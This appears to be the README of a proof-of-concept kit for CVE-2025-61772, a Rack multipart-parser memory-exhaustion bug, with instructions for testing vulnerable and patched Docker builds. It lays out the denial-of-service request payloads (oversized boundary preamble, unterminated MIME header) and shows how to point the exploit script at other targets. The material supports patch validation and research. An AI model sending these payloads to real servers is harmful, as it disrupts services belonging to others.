# CVE-2025-61772 Proof of Concept (PoC)

## Overview

This directory contains a comprehensive Proof of Concept (PoC) demonstrating **CVE-2025-61772**, a memory exhaustion vulnerability in Rack's multipart parser.

**CVE-2025-61772**: Multipart parser buffers unbounded per-part headers, enabling DoS (memory exhaustion)

---

## ğŸ“‹ Vulnerability Details

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2025-61772 |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |
| **CVSS v3.1** | 7.5 HIGH |
| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| **Published** | 2025-10-07 |
| **Component** | Rack Ruby web server interface |

### Description

The Rack multipart parser accumulates unbounded data when:
1. Searching for multipart boundaries without proper size limits
2. Parsing MIME headers that never terminate correctly

This allows remote attackers to exhaust server memory by sending crafted multipart requests.

---

## ğŸ¯ Attack Vectors

### 1. Boundary Search Memory Exhaustion
- **Limit (Patched)**: 16 KB (with cumulative counter)
- **Attack**: Send large data before actual multipart boundary
- **Impact**: Parser buffers all data searching for boundary â†’ Memory exhaustion

### 2. MIME Header Memory Exhaustion
- **Limit (Patched)**: 64 KB
- **Attack**: Send large MIME header without proper termination (`\r\n\r\n`)
- **Impact**: Parser buffers header indefinitely â†’ Memory exhaustion

---

## ğŸ“¦ PoC Components

### Files

1. **`exploit.rb`** - Main exploit script
   - Simulates both attack vectors
   - Configurable target URL
   - Detailed output with HTTP responses

2. **`vulnerable_app.rb`** - Simple Rack application
   - Handles multipart file uploads
   - Used as test target
   - Returns JSON responses

3. **`test.sh`** - Automated test suite
   - Builds Docker containers (vulnerable & patched)
   - Runs exploit against both versions
   - Validates protection effectiveness
   - Color-coded output

4. **`Dockerfile.vulnerable`** - Vulnerable Rack 2.0.9.0
   - Official unpatched version from rubygems.org
   - No security fixes
   - Demonstrates vulnerability

5. **`Dockerfile.patched`** - Patched Rack 2.0.9.1
   - Uses `rack-2.0.9.1-complete-fix.gem` from parent directory
   - Complete fix with cumulative counter
   - 100% protection

6. **`.dockerignore`** - Docker build context control
   - Only includes necessary files
   - Excludes documentation and tests

---

## ğŸš€ Quick Start

### Prerequisites

- Docker installed
- Ruby 2.7+ (for local testing)
- Bash shell

### Running the PoC

**Option 1: Automated Test Script (Recommended)**

```bash
cd poc
./test.sh
```

**Expected Output (Patched System)**:
```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  CVE-2025-61772 PoC Test Suite                                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[1/5] Building Docker images...
âœ“ Vulnerable image built
âœ“ Patched image built

[2/5] Testing VULNERABLE version (Rack 2.0.9.0)
âœ“ Expected: Vulnerable version IS VULNERABLE

[3/5] Testing PATCHED version (Rack 2.0.9.1 + Complete Fix)
âœ… Expected: Patched version successfully blocked all attacks!

FINAL RESULTS:
Patched Version: âœ… PROTECTED
Result: Rejects unbounded multipart data
Fix: 16KB boundary limit, 64KB header limit

âœ“ ALL TESTS PASSED
```

---

**Option 2: Manual Docker Testing**

```bash
cd poc

# Build containers
docker build -f Dockerfile.vulnerable -t rack-vulnerable .
docker build -f Dockerfile.patched -t rack-patched .

# Run vulnerable version
docker run -d -p 9292:9292 --name vulnerable rack-vulnerable

# Test against vulnerable
ruby exploit.rb http://localhost:9292/upload
# Expected: HTTP 200 (attacks succeed)

# Stop vulnerable
docker stop vulnerable && docker rm vulnerable

# Run patched version
docker run -d -p 9292:9292 --name patched rack-patched

# Test against patched
ruby exploit.rb http://localhost:9292/upload
# Expected: HTTP 400 (attacks blocked)

# Cleanup
docker stop patched && docker rm patched
```

---

**Option 3: Local Testing (Without Docker)**

```bash
cd poc

# Install vulnerable Rack
gem install rack -v 2.0.9.0

# Run vulnerable app
ruby vulnerable_app.rb &
APP_PID=$!

# Test
ruby exploit.rb http://localhost:9292/upload

# Stop app
kill $APP_PID

# Install patched Rack
gem install ../rack-2.0.9.1-complete-fix.gem

# Run patched app
ruby vulnerable_app.rb &
APP_PID=$!

# Test again
ruby exploit.rb http://localhost:9292/upload

# Stop app
kill $APP_PID
```

---

## ğŸ§ª Test Results

### Vulnerable Version (Rack 2.0.9.0)

```
Attack 1 (Boundary Search Exhaustion):
  Response: 200 OK
  Body: {"status":"success"...}
  âŒ Server accepted large boundary data (VULNERABLE)

Attack 2 (MIME Header Exhaustion):
  Response: 200 OK
  Body: {"status":"success"...}
  âŒ Server accepted large MIME header (VULNERABLE)

OVERALL: âŒ VULNERABLE TO CVE-2025-61772
```

### Patched Version (Rack 2.0.9.1 + Complete Fix)

```
Attack 1 (Boundary Search Exhaustion):
  Response: 400 Bad Request
  Body: {"status":"error","message":"multipart boundary not found within limit"}
  âœ… Server rejected request (PROTECTED)

Attack 2 (MIME Header Exhaustion):
  Response: 400 Bad Request
  Body: {"status":"error","message":"multipart mime part header too large"}
  âœ… Server rejected request (PROTECTED)

OVERALL: âœ… PROTECTED AGAINST CVE-2025-61772
```

---

## ğŸ“Š Attack Details

### Attack 1: Boundary Search Exhaustion

**Payload**:
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=AaB03x
Content-Length: 102400

[100KB of "X" characters]
--AaB03x
Content-Disposition: form-data; name="file"; filename="test.txt"

test
--AaB03x--
```

**How It Works**:
- Sends 100KB of garbage data before the first boundary
- Vulnerable parser buffers all data during search
- Patched parser detects after 16KB (cumulative tracking)

---

### Attack 2: MIME Header Exhaustion

**Payload**:
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=AaB03x
Content-Length: 204800

--AaB03x
Content-Disposition: form-data; name="file"; filename="test.txt"
[200KB of garbage without \r\n\r\n terminator]
```

**How It Works**:
- Sends oversized MIME headers without proper termination
- Parser keeps buffering waiting for `\r\n\r\n`
- Patched parser rejects after 64KB

---

## ğŸ”§ Customization

### Modify Attack Size

**Edit `exploit.rb`**:
```ruby
# Line ~35: Adjust boundary preamble size
PREAMBLE_SIZE = 100 * 1024  # Change to desired size

# Line ~90: Adjust MIME header size
HEADER_SIZE = 200 * 1024    # Change to desired size
```

### Change Target URL

```bash
# Command line
ruby exploit.rb http://your-target:port/upload

# Or edit exploit.rb
# Line ~10: DEFAULT_TARGET = "http://your-target:port/upload"
```

### Adjust Timeouts

**Edit `exploit.rb`**:
```ruby
# Line ~20: HTTP timeout
http.open_timeout = 10  # Change to desired seconds
http.read_timeout = 30  # Change to desired seconds
```

---

## ğŸ› ï¸ Troubleshooting

### Docker Build Fails

**Issue**: `ERROR: failed to solve: failed to calculate checksum`

**Solution**:
```bash
# Ensure gem file is copied to poc directory
cp ../rack-2.0.9.1-complete-fix.gem .

# Rebuild
docker build -f Dockerfile.patched -t rack-patched .
```

---

### Port Already in Use

**Issue**: `Address already in use - bind(2) for "0.0.0.0" port 9292`

**Solution**:
```bash
# Find process using port
lsof -i :9292

# Kill process
kill -9 <PID>

# Or use different port
# Edit vulnerable_app.rb line ~75: port = 9293
```

---

### Exploit Script Fails

**Issue**: `Connection refused (Errno::ECONNREFUSED)`

**Solution**:
```bash
# Wait for server to start
sleep 5

# Check if server is running
curl http://localhost:9292/health

# Check Docker logs
docker logs vulnerable
docker logs patched
```

---

## ğŸ“ File Structure

```
poc/
â”œâ”€â”€ exploit.rb              - Attack simulation script
â”œâ”€â”€ vulnerable_app.rb       - Test target application
â”œâ”€â”€ test.sh                 - Automated test suite
â”œâ”€â”€ Dockerfile.vulnerable   - Vulnerable container
â”œâ”€â”€ Dockerfile.patched      - Patched container
â”œâ”€â”€ .dockerignore           - Docker build context
â”œâ”€â”€ README.md               - This file
â””â”€â”€ QUICK_START.txt         - Quick reference guide
```

---

## ğŸ” Security Notes

### Safe Testing

- âš ï¸ **Only test against systems you own**
- âš ï¸ Run tests in isolated environments
- âš ï¸ Do not use against production systems
- âš ï¸ Monitor resource usage during tests

### Ethical Use

This PoC is provided for:
- âœ… Security research and education
- âœ… Vulnerability validation
- âœ… Patch effectiveness testing
- âœ… Security awareness

**NOT** for:
- âŒ Unauthorized testing
- âŒ Malicious attacks
- âŒ Production disruption

---

## ğŸ“š Additional Resources

### Related Files

- `../README.md` - Complete vulnerability documentation
- `../CVE-2025-61772-complete-fix.patch` - Security patch
- `../rack-2.0.9.1-complete-fix.gem` - Patched package

### External Resources

- [Rack GitHub](https://github.com/rack/rack)
- [CVE-2025-61772 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-61772)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

---

## ğŸ†˜ Support

### Common Issues

1. **Docker not installed**: Install from https://docs.docker.com/get-docker/
2. **Ruby not available**: Install Ruby 2.7+ from https://www.ruby-lang.org/
3. **Port conflicts**: Change port in `vulnerable_app.rb`
4. **Gem build fails**: Ensure `rack-2.0.9.1-complete-fix.gem` is in parent directory

### Getting Help

For issues or questions:
1. Review the main `README.md` documentation
2. Check `test.sh` output for detailed error messages
3. Verify Docker is running: `docker ps`
4. Check Ruby version: `ruby --version`

---

**Document Version**: 1.0  
**Last Updated**: November 27, 2025  
**Status**: Production Ready
